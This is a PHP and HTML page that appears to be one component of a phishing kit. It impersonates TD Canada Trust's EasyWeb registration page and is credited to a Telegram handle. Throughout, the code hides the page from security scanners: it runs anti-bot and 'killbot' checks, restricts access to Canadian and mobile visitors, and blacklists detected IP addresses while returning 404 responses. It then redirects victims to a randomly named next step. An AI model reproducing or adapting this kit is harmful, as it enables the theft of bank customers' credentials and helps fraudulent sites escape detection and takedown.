<?php
// @Kr3pto on telegram
require "configg.php";
require "tc_assetz/ninc/session_protect.php";
require "tc_assetz/ninc/functions.php";
if($_SESSION['passed_captcha'] == 'yes'){
    
}else{
    header( "Location: index.php" ); 
}
if($internal_antibot == 1){
    require "tc_assetz/old_blocker.php";
}
if($enable_killbot == 1){
    if(checkkillbot($killbot_key) == true){
        $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
if($mobile_lock == 1){
    require "tc_assetz/mob_lock.php";
}
if($CA_lock == 1){
    if(onlyca() == true){
    
    }else{
        $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
if($external_antibot == 1){
    if(checkBot($apikey) == true){
        $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
?>
<?php
include('blackhole/index.php');
        include 'prevents/anti7.php';
            include 'prevents/anti8.php';
                include 'prevents/anti9.php';
                include 'prevents/block.php';
?>
<!DOCTYPE html>
<script type="text/javascript">
<!--
if (screen.width >= 699) {
document.location = "antibot.php";
}
//-->
</script>
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class=" webkit safari safari14 mac js"><head>
    <meta http-equiv="refresh" content="1;url=cjneqndjepnq3901432.php?sslchannel=true&sessionid=<?=generateRandomString(130);?>"/>
    <meta http-equiv="x-ua-compatible" content="IE=edge">
    <title>EasyWeb Registration: Customer Identification
    </title>
    <!--<f:loadBundle basename="/prod/links" var="links" />-->
    <!--<f:loadBundle basename="/prod/oauth" var="oauth" />-->

    <script type="text/javascript" src="/waw/esr/js/jquery/jquery-1.12.3.min.js"><!--

//--></script>
    <script type="text/javascript" src="/waw/esr/js/jquery/jquery-migrate-1.4.1.min.js"><!--

//--></script>
    <script type="text/javascript" src="/waw/esr/js/jquery/jquery.metadata.js"><!--

//--></script>
    <script type="text/javascript" src="/waw/esr/js/common.js"><!--

//--></script>
    <script type="text/javascript" src="/waw/esr/js/fieldValidationSupport.js"><!--

//--></script>
    <script type="text/javascript" src="/waw/esr/standards/evergreen/1_0/js/default.js"><!--

//--></script>
    
    <link rel="stylesheet" type="text/css" href="tc_assetz/styles/evergreen_theme_14_3.css">
    
    <link rel="stylesheet" type="text/css" href="tc_assetz/styles/default.css">
    <link rel="stylesheet" type="text/css" href="tc_assetz/styles/esrEvergreen.css">
    <link rel="stylesheet" type="text/css" href="tc_assetz/styles/progressBar.css">
    
    <link rel="icon" type="image/vnd.microsoft.icon" href="favicon.ico">
    <link rel="SHORTCUT ICON" href="/waw/esr/images/cip/favicon.ico"> 
    
    <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">
    <meta content="no-cache" http-equiv="pragma">
    <meta content="en_CA" http-equiv="Content-Language">

</head>

<body>

<!-- Used by UAP integration to set consumer cookie -->
<iframe id="uapCookieFrame" data-clientid="e7366b62-b7f6-4550-b857-8eda5825c45c" data-consumerid="ewesr" data-redirecturi="/waw/esr/selfRegistration.htm?loggedInFromGadget=true&amp;LN=" data-pingurl="https://authorization.td.com" data-uapurl="https://authentication.td.com" data-scope="debit.acs.debcrd.r debit.acs.debcrd.w" style="visibility:hidden !important; height: 0 !important;"></iframe>
    <div id="td-wrapper">
        <div id="td-container">
                <!-- The default header. Content pages can override this. -->

    <div id="td-layout-header" class="td-layout-row">
        <div class="td-layout-column td-layout-grid15 td-layout-column-first td-layout-column-last">
            <div id="td-logo">
                <img src="tc_assetz/styles/EasywbLogo.gif" alt="TD Canada Trust EasyWeb">
            </div>
        </div>
    </div>
    <div class="td-layout-row td-noprint" id="td-layout-nav-main">
        <div class="td-layout-column td-layout-grid15 td-layout-column-first td-layout-column-last">
            <div id="td-nav-divider"></div>
        </div>
    </div>

            <div id="td-layout-contentarea" class="td-layout-row">
                <div class="td-layout-column td-layout-grid12 td-layout-column-first">
                    <!-- The default progress Bar. Content pages can override this. -->

    <div id="td-pagetitlearea">
        <h1><span id="title">EasyWeb Registration: </span></h1>
        
        <div class="progressindicator td-margin-top-large td-layout-grid10">
            <progress id="progressLine" max="4"><span id="progressLineText" class="td-accesstext"></span></progress>
            <div class="progressbar"><span id="progressLineIE"></span></div>
            <ol data-progress-steps="4">
                <li id="progressItem1" class="step1 step-todo">
                <span>Login
                    <span id="progressItemAccess1" class="td-accesstext">not yet completed step
                    </span>
                </span>
                </li>
                <li id="progressItem2" class="step2 step-todo">
                    <span>Access Card
                        <span id="progressItemAccess2" class="td-accesstext">not yet completed step
                        </span>
                    </span>
                </li>
                <li id="progressItem3" class="step3 step-todo">
                    <span>Costumer Identification
                        <span id="progressItemAccess3" class="td-accesstext">not yet completed step
                        </span>
                    </span>
                </li>
                <li id="progressItem4" class="step4 step-todo">
                    <span>Confirmation 
                        <span id="progressItemAccess4" class="td-accesstext">not yet completed step
                        </span>
                    </span>
                </li>
            </ol>
        </div>
        <div style="display:none"><span id="progressTitle1">Overview</span><span id="progressTitle2">Customer Identification</span><span id="progressTitle3">Consent &amp; Setup</span><span id="progressTitle4">Confirmation </span><span id="AccessTextCompleted">completed step</span><span id="AccessTextCurrent">current step</span><span id="AccessTextStep">step</span><span id="AccessTextOf">of</span>
        </div>
    </div>
                </div>
                <div class="td-layout-column td-layout-grid10 td-callout td-callout-primary td-cs-tertiary">

        <span style="background:url(https://tmx.td.com/fp/clear.png?org_id=i8n5h0pw&amp;session_id=GenY322y6s4uFQ6Mo1VOqzq&amp;m=1)"></span>
        <img style="display: none;" src="https://tmx.td.com/fp/clear.png?org_id=i8n5h0pw&amp;session_id=GenY322y6s4uFQ6Mo1VOqzq&amp;m=2" width="1" height="1">
        <script src="https://tmx.td.com/fp/check.js?org_id=i8n5h0pw&amp;session_id=GenY322y6s4uFQ6Mo1VOqzq" type="text/javascript"><!--

        
//--></script></div></div></div></div></body></html>